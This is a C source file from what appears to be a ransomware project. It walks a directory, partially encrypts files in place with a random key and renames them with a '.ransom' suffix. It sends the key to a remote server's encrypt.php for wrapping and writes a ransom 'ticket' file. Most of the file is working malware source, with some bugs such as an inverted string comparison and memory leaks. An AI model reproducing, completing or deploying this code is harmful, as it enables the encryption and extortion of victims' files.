#include "ransomlib.h"
#include "thirdparty/b64.h"
#include "weakcrypt.h"
#include "crypt.h"
#include "os.h"
#include "common.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

int encryptSymmetricKey(char** encrypted_key, const int pubkeyid, const char* key){
	//Get key in hex
	char* hexkey=b16encode(key,SYMMETRIC_KEY_SIZE);
	
	//Base url
	const char* base_url=SERVER_OSIR_HOME "/client-interface/encrypt.php";
	
	//Allocate memory for url
	char* url=(char*)malloc(sizeof(char)*(strlen(base_url)+2+strlen(hexkey)+strlen("?pubid=&symkey=")));
	
	
	//Make string from public key id
	char pki_string[5];
	itoa(pubkeyid,pki_string,10);
	
	//Make url
	strcpy(url,base_url);
	strcat(url,"?keyid=");
	strcat(url,pki_string);
	strcat(url,"&symkey=");
	strcat(url,hexkey);
	strcat(url,"\0");
	printf("URL: %s\n",url);
	//Get encrypted key
	int ret=decryptRemoteBytes(encrypted_key,url);
	
	//Deallocate memory and return encrypted key size
	free(url);
	free(hexkey);
	return ret;
}

bool partialEncryptFile(const char* keyiv, const char* filename, int64_t number_of_bytes){
	FILE* hostage=fopen(filename,"rb");
	if(hostage==NULL){
		fprintf(stderr,"Error: partialEncryptFile: cannot open file\n");
		return 0;
	}
	
	//Get file size
	fseek(hostage,0,SEEK_END);
	int64_t file_size=ftell(hostage);
	fseek(hostage,0,SEEK_SET);
	
	//Restrain number_of_bytes to file size
	number_of_bytes=file_size>number_of_bytes?number_of_bytes:file_size;
	
	//Read bytes for encryption
	char* plaintext=(char*)malloc(sizeof(char)*number_of_bytes);
	fread(plaintext,1,number_of_bytes,hostage);
	
	//Encrypt bytes
	char* ciphertext=(char*)malloc(sizeof(char)*number_of_bytes);
	symEncrypt(&ciphertext,keyiv,plaintext,number_of_bytes);
	
	//Close then open to write
	fclose(hostage);
	hostage = fopen(filename,"r+b");
	
	//Write bytes
	printf("w\n");
	if(fwrite(ciphertext,1,number_of_bytes,hostage)!=(unsigned long)number_of_bytes){
		fprintf(stderr,"Error: partialEncryptFile: writing failed\n");
		return 0;
	}
	
	//cleanup
	fclose(hostage);
	free(plaintext);
	free(ciphertext);
	return 1;
	
}

bool encryptDirectory(const char* directory){
	char** ls=walkDir(directory);
	
	//Check for existing ticket
	for (int i = 0; ls[i][0] == TICKET_FILENAME[0]; i++)
		if (strcmp(ls[i],TICKET_FILENAME)){
			//If there are no hostages, rm ticket
			//else
			//Make sure there is release script/note
			//quit
			return 0;
		}
	
	//Generate key+iv
	char* keyiv;
	if(!secureRand(&keyiv,SYMMETRIC_KEY_SIZE+SYMMETRIC_IV_SIZE)){
		fprintf(stderr,"Error: encryptDirectory: failed to generate keyiv");
		return 0;
	}
	
	//Get key id
	int keyid = ASYMMETRIC_KEY_ID;
	
	//encrypt directory
	char* newfname;
	for(int i = 0; strcmp(ls[i], "\0") && i<5; i++){
		//Partial encrypt ls[i]
		printf("%d\n", partialEncryptFile(keyiv, ls[i], MAX_BYTES_TO_ENCRYPT));
		
		//Append '.ransom' to filename
		newfname=malloc(strlen(ls[i])+9);
		strcpy(newfname,ls[i]);
		strcat(newfname,".ransom");
		if(rename(ls[i],newfname))printf("Renaming failed\n");
	}
	
	//Encrypt key
	char* encrypted_key;
	int encrypted_key_size=encryptSymmetricKey(&encrypted_key,keyid,keyiv);
	
	//Make raw ticket
	char* raw_ticket=(char*)malloc(2+encrypted_key_size);
	raw_ticket[0]=keyid/256;//Note: this means max keyid is 2^16-1
	raw_ticket[1]=keyid%256;//Pretty large if you ask me
	for(int i=0;i<encrypted_key_size;i++)raw_ticket[i+2]=encrypted_key[i];
	
	//Make hex ticket
	printf("Encrypted_key %s\n",encrypted_key);
	char* ticket=b16encode(raw_ticket,2+encrypted_key_size);
	printf("Ticket: %s\n",ticket);
	
	//Write ticket to file
	FILE* ticket_fp=fopen(TICKET_FILENAME,"wb");
	fwrite(ticket,1,2+encrypted_key_size,ticket_fp);
	fclose(ticket_fp);
	
	//Free each element in ls
	int i=0;
	while(strcmp(ls[i], "\0"))
		free(ls[i++]);
	free(ls[i]);
		
	
	//Free pointers
	free(ls);
	free(newfname);
	free(keyiv);
	free(encrypted_key);
	free(raw_ticket);
	free(ticket);
	return 1;
}